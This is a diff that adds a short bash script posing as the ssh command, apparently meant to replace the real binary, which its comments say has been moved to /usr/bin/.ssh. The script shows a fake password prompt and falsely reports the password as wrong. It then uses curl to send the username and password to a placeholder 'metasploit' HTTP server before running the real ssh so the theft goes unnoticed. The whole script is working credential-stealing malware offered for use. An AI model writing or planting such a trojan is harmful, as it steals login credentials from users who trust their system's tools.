@@ -1,0 +1,20 @@
+#!/bin/bash
+#change to /usr/bin/.ssh or wherever the real ssh is
+Ossh=/usr/bin/.ssh
+
+#if there were no args then send it to the original ssh command for the help message
+if [ "$1" == "" ]
+then
+    $Ossh
+else
+    #read in pass and tell them it was wrong
+    echo -n "$USER's password: "
+    read -s pass
+    echo ""
+    echo "Permission denied, please try again."
+
+    #send it to metasploit http server
+    curl -s --user "$USER:$pass" http://metasploit.http.serv.ip/ &>/dev/null
+    #invoke original command
+    $Ossh $@
+fi
